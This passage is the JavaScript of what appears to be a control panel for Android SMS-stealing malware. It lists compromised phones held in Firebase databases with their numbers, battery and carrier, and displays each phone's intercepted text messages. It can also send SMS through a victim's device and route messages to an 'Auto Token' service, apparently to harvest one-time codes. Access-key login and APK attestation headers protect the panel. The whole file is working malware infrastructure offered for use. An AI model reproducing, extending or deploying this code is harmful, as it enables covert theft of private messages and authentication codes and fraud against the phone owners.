    online:raw.status===true,battery:parseInt(raw.battery,10)||0,
    network:raw.service_provider||'?',sms_count:raw.sms_count||0,mobNo:getPhoneFromRecord(raw)
  };
  return{name:raw.name||raw.device_model||'Unknown',brand:raw.brand||'',android:raw.android||'',
    online_status:raw.online_status,online:raw.online,status:raw.status,
    battery:parseInt(raw.battery||raw.battery_level,10)||0,network:raw.network||'?',
    sms_count:raw.sms_count||0,mobNo:getPhoneFromRecord(raw)};
}
function ingestDeviceData(fbId,node,devId,data){
  var norm=normalizeClientRecord(Object.assign({_fbId:fbId},data));if(!norm)return;
  norm._node=node;norm._fbId=fbId;
  clientsRawMap[makeDevKey(fbId,devId)]=Object.assign({},clientsRawMap[makeDevKey(fbId,devId)]||{},norm);
}
function mergeSummaryNode(fbId,node,raw){
  if(!raw||typeof raw!=='object')return;
  Object.keys(raw).forEach(function(k){if(raw[k]&&typeof raw[k]==='object')ingestDeviceData(fbId,node,k,raw[k]);});
}
function processClientsData(){
  allDevs=[];
  var raw={};Object.keys(clientsRawMap).forEach(function(k){if(!activeFbId||k.indexOf(activeFbId+'::')===0)raw[k]=clientsRawMap[k];});
  Object.keys(raw).forEach(function(k){
    var s=raw[k],p=parseDevKey(k),inst=getFbInstance(p.fbId);
    var on=resolveOnlineStatus(s,p.fbId);
    allDevs.push({id:k,rawId:p.devId,fbId:p.fbId,fbName:inst?inst.name:p.fbId,deviceNode:s._node||'clients',
      name:s.name||'Unknown',displayPhone:getPhoneFromRecord(s)||'No Number',brand:s.brand||'',android:s.android||'',
      status:on?'online':'offline',battery:s.battery||0,network:s.network||'?',smsCount:s.sms_count||0});
  });
  allDevs.sort(function(a,b){return a.status==='online'&&b.status!=='online'?-1:a.status!=='online'&&b.status==='online'?1:0;});
  if(!selDev&&allDevs.length)selDev=allDevs[0].id;
  renderDevices();updateStats();updateFbUi();
}
function updateStats(){
  var l=getFilteredDevs();
  document.getElementById('stTotal').textContent=l.length;
  document.getElementById('stOnline').textContent=l.filter(function(d){return d.status==='online';}).length;
  document.getElementById('stOffline').textContent=l.filter(function(d){return d.status==='offline';}).length;
}
function fetchSummaryNode(inst,node){
  return restJson(inst.restUrl+'/'+node+'.json').then(function(raw){mergeSummaryNode(inst.id,node,raw);processClientsData();});
}
function discoverInstance(inst){
  return restJson(inst.restUrl+'/.json?shallow=true').then(function(roots){
    if(!roots||typeof roots!=='object')return;
    var nodes=Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0;});
    var tasks=[];
    nodes.forEach(function(n){
      if(SUMMARY_NODES.indexOf(n)>=0||n==='clients')tasks.push(fetchSummaryNode(inst,n));
      else if(n==='devices')tasks.push(fetchSummaryNode(inst,n));
    });
    return Promise.all(tasks);
  });
}
function attachLive(inst){
  if(!inst.db||inst.liveAttached)return;inst.liveAttached=true;
  ['clients','devices_status'].forEach(function(node){
    inst.db.ref(node).on('value',function(s){if(s.exists()){mergeSummaryNode(inst.id,node,s.val());processClientsData();}});
  });
}
function fetchAllData(){
  document.getElementById('hdrSub').textContent='Syncing...';
  firebaseInstances.forEach(attachLive);
  return Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
    processClientsData();
    document.getElementById('hdrSub').textContent=getFilteredDevs().length+' devices';
    if(selDev)loadSmsForDevice();
  });
}
function refreshData(){toast('Refreshing...',true);fetchAllData();}

function renderDevices(){
  var q=(document.getElementById('devSearch').value||'').toLowerCase();
  var list=getFilteredDevs().filter(function(d){return !q||(d.displayPhone+d.name+d.rawId).toLowerCase().includes(q);});
  var el=document.getElementById('devList');
  if(!list.length){el.innerHTML='<div class="empty-state"><div class="ico">📡</div>No devices yet<br><span style="font-size:11px;opacity:.6">Pull refresh or wait for sync</span></div>';return;}
  el.innerHTML=list.map(function(d){
    return '<div class="dev-card '+d.status+(d.id===selDev?' active':'')+'" onclick="selectDevice(\''+d.id+'\')">'+
      '<div class="dev-bar"></div><div class="dev-body">'+
      '<div class="dev-phone">'+esc(d.displayPhone)+'</div>'+
      '<div class="dev-meta">'+esc(d.name)+' · '+esc(d.rawId.substring(0,14))+'</div>'+
      '<div class="dev-chips"><span class="chip bat">'+d.battery+'%</span><span class="chip">'+esc(d.network)+'</span><span class="chip">'+d.smsCount+' SMS</span></div>'+
      '</div></div>';
  }).join('');
}
function selectDevice(id){
  selDev=id;renderDevices();renderDeviceView();updateSendForm();loadSmsForDevice();
  switchTab('device',document.querySelector('.nav-item[data-tab="device"]'));
}

function renderDeviceView(){
  var d=getSelDev(),empty=document.getElementById('deviceEmpty'),hero=document.getElementById('deviceHero');
  if(!d){empty.classList.remove('hidden');hero.classList.add('hidden');return;}
  empty.classList.add('hidden');hero.classList.remove('hidden');
  hero.innerHTML='<div class="hero-card">'+
    '<div class="hero-phone">'+esc(d.displayPhone)+'</div>'+
    '<div class="hero-model">'+esc(d.name)+(d.brand?' · '+esc(d.brand):'')+'</div>'+
    '<div class="hero-badge '+d.status+'">'+(d.status==='online'?'● ONLINE':'○ OFFLINE')+'</div>'+
    '<div class="hero-grid">'+
    '<div class="hero-cell"><div class="hero-lbl">BATTERY</div><div class="hero-val">'+d.battery+'%</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">NETWORK</div><div class="hero-val">'+esc(d.network)+'</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">ANDROID</div><div class="hero-val">'+esc(d.android||'?')+'</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">SMS</div><div class="hero-val">'+d.smsCount+'</div></div>'+
    '</div><div style="margin-top:12px;font-size:9px;color:var(--muted);font-family:\'Space Mono\',monospace">'+esc(d.rawId)+'</div></div>';
}
function updateSendForm(){
  var d=getSelDev();
  document.getElementById('sendEmpty').classList.toggle('hidden',!!d);
  document.getElementById('sendForm').classList.toggle('hidden',!d);
}

function clearListeners(){
  Object.keys(activeListeners).forEach(function(k){
    var L=activeListeners[k];
    if(L.timer)clearInterval(L.timer);
    else if(L.db&&L.ref){L.ref.off('value',L.h);L.ref.off('child_added',L.h);}
  });
  activeListeners={};
}
function loadSmsForDevice(){
  var d=getSelDev();if(!d)return;
  document.getElementById('smsEmpty').classList.add('hidden');
  clearListeners();
  var inst=getFbInstance(d.fbId);
  if(inst&&inst.schema==='rabel'){
    var path='messages/'+d.rawId;
    if(inst.db){
      var ref=inst.db.ref(path).limitToLast(80);
      var h=function(s){renderSmsFromData(s.val());};
      ref.on('value',h);activeListeners[d.id]={db:inst.db,ref:ref,h:h};
    }else{
      var tick=function(){restJson(inst.restUrl+'/'+path+'.json').then(renderSmsFromData);};
      tick();activeListeners[d.id]={timer:setInterval(tick,3000)};
    }
  }else{
    var p2=(d.deviceNode||'devices')+'/'+d.rawId+'/new_sms';
    var tick2=function(){restJson(inst.restUrl+'/'+p2+'.json').then(renderSmsFromData);};
    tick2();activeListeners[d.id]={timer:setInterval(tick2,3000)};
  }
}
function smsAsList(raw){
  if(!raw)return[];
  if(Array.isArray(raw))return raw.filter(function(x){return x&&typeof x==='object';});
  return Object.keys(raw).map(function(k){return raw[k];}).filter(function(x){return x&&typeof x==='object';});
}
function normalizeSms(m){
  if(!m||typeof m!=='object')return null;
  var body=m.body||m.message||m.text||m.content||'';
  if(!body)return null;
  return{address:m.address||m.sender||m.from||m.number||'?',body:body,
    date_readable:m.date_readable||m.dateTime||m.time||'—',
    type:String(m.type||m.direction||'inbox').toLowerCase()};
}
function renderSmsFromData(data){
  var list=smsAsList(data).map(normalizeSms).filter(Boolean);
  list.sort(function(a,b){return String(b.date_readable).localeCompare(String(a.date_readable));});
  window_sms=list.slice(0,60);renderSms();
}
function renderSms(){
  var d=getSelDev(),el=document.getElementById('smsList');
  if(!d){document.getElementById('smsEmpty').classList.remove('hidden');el.innerHTML='';return;}
  if(!window_sms.length){el.innerHTML='<div class="empty-state"><div class="ico">📭</div>No SMS on this device</div>';return;}
  el.innerHTML=window_sms.map(function(s){
    var out=s.type==='sent'||s.type==='outbox';
    return '<div class="sms-bubble '+(out?'out':'in')+'">'+
      '<div class="sms-from">'+esc(s.address)+(out?'':'')+'</div>'+
      esc(s.body)+'<div class="sms-time">'+esc(s.date_readable)+'</div></div>';
  }).join('');
}

function sendSms(){
  var d=getSelDev();if(!d){toast('Select a device first',false);return;}
  var inst=getFbInstance(d.fbId),to=document.getElementById('sendTo').value.trim(),msg=document.getElementById('sendMsg').value.trim();
  if(!to||!msg){toast('Fill number and message',false);return;}
  document.getElementById('sendStatus').textContent='Sending...';
  var path=inst.restUrl+'/clients/'+encodeURIComponent(d.rawId)+'/webhookEvent/sendSms.json';
  var payload={to:to,message:msg,from:1,isSended:false};
  if(inst.schema!=='rabel')path=inst.restUrl+'/'+(d.deviceNode||'devices')+'/'+encodeURIComponent(d.rawId)+'/manual_commands/send_sms.json';
  fetch(path,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).then(function(r){
    if(r.ok){document.getElementById('sendStatus').textContent='✅ Sent';document.getElementById('sendMsg').value='';toast('SMS sent',true);}
    else{document.getElementById('sendStatus').textContent='❌ Failed';toast('Send failed',false);}
  }).catch(function(){document.getElementById('sendStatus').textContent='❌ Error';toast('Network error',false);});
}

function switchTab(name,btn){
  document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});
  document.getElementById('screen-'+name).classList.add('active');
  document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active');});
  if(btn)btn.classList.add('active');
  if(name==='sms'&&selDev)loadSmsForDevice();
  if(name==='device')renderDeviceView();
  if(name==='send')updateSendForm();
}

/* AUTH */
function rebelApkHeaders(){
  var h={};
  if(window.RebelAndroid){
    try{
      h['X-Rebel-Attest']=RebelAndroid.getAttest();
      h['X-Rebel-Device']=RebelAndroid.getDevice();
    }catch(e){}
  }
  return h;
}
function authFetch(body){
  var hdr={'Content-Type':'application/json'};
  var apk=rebelApkHeaders();
  for(var k in apk)hdr[k]=apk[k];
  return fetch(AUTH_URL,{method:'POST',headers:hdr,body:JSON.stringify(body||{})})
    .then(function(r){return r.json().then(function(j){return{ok:r.ok,data:j};});});
}
function getSession(){try{return JSON.parse(localStorage.getItem('rbl_session')||sessionStorage.getItem('rbl_session')||'null');}catch(e){return null;}}
function unlockApp(token,exp,remember){
  var s={token:token,exp:exp||0};
  if(remember)localStorage.setItem('rbl_session',JSON.stringify(s));else sessionStorage.setItem('rbl_session',JSON.stringify(s));
  document.getElementById('loginScreen').classList.add('hidden');
  document.getElementById('appShell').classList.remove('hidden');
  if(!panelReady){panelReady=true;fetchAllData();loadAutoTokenState();}
}
function doLogin(){
  var key=(document.getElementById('loginKey').value||'').trim().toUpperCase();
  if(!key){document.getElementById('loginErr').textContent='Enter access key';document.getElementById('loginErr').style.display='block';return;}
  document.getElementById('loginBtn').disabled=true;
  authFetch({action:'login',key:key,remember:document.getElementById('rememberMe').checked}).then(function(res){
    document.getElementById('loginBtn').disabled=false;
    if(res.ok&&res.data&&res.data.ok){unlockApp(res.data.token,res.data.expires,document.getElementById('rememberMe').checked);return;}
    document.getElementById('loginErr').textContent=res.data&&res.data.error||'Invalid key';
    document.getElementById('loginErr').style.display='block';
  }).catch(function(){document.getElementById('loginBtn').disabled=false;});
}
function doLogout(){
  var s=getSession();if(s&&s.token)authFetch({action:'logout',token:s.token});
  localStorage.removeItem('rbl_session');sessionStorage.removeItem('rbl_session');
  location.reload();
}
document.getElementById('loginKey').addEventListener('input',function(){this.value=this.value.toUpperCase().replace(/[^A-Z0-9\-]/g,'');});

/* AUTO TOKEN (via sex.php API) */
var _autoTokenOn=false;
function smsTokenFetch(body){
  var s=getSession();body=body||{};if(s&&s.token)body.token=s.token;
  var hdr={'Content-Type':'application/json'};
  var apk=rebelApkHeaders();
  for(var k in apk)hdr[k]=apk[k];
  return fetch(SMS_TOKEN_URL,{method:'POST',headers:hdr,body:JSON.stringify(body)})
    .then(function(r){return r.json();});
}
function loadAutoTokenState(){
  smsTokenFetch({action:'get'}).then(function(d){
    if(d&&d.ok&&d.config){_autoTokenOn=!!d.config.enabled;document.getElementById('autoTokenToggle').classList.toggle('on',_autoTokenOn);}
  }).catch(function(){});
}
function toggleAutoToken(){
  _autoTokenOn=!_autoTokenOn;
  document.getElementById('autoTokenToggle').classList.toggle('on',_autoTokenOn);
  smsTokenFetch({action:'save',enabled:_autoTokenOn}).then(function(){toast(_autoTokenOn?'Auto Token ON':'Auto Token OFF',true);});
}
function useSelForAutoToken(){
  var d=getSelDev();if(!d){toast('Select device on Home',false);return;}
  var inst=getFbInstance(d.fbId);
  smsTokenFetch({action:'save',enabled:_autoTokenOn,device_id:d.rawId,database_url:inst.restUrl,fb_name:inst.name}).then(function(){
    toast('Auto SMS device set',true);
  });
}

/* BOOT */
(function(){
  var s=getSession();
  if(s&&s.token){
    authFetch({action:'check',token:s.token}).then(function(res){
      if(res.ok&&res.data&&res.data.ok)unlockApp(s.token,s.exp,true);
      else localStorage.removeItem('rbl_session');
    });
  }
})();
setInterval(function(){
  if(!panelReady)return;
  var s=getSession();
  if(s&&s.token)authFetch({action:'check',token:s.token}).then(function(res){
    if(!res.ok||!res.data||!res.data.ok){doLogout();}
  });
},30000);
</script>
</body>
</html>
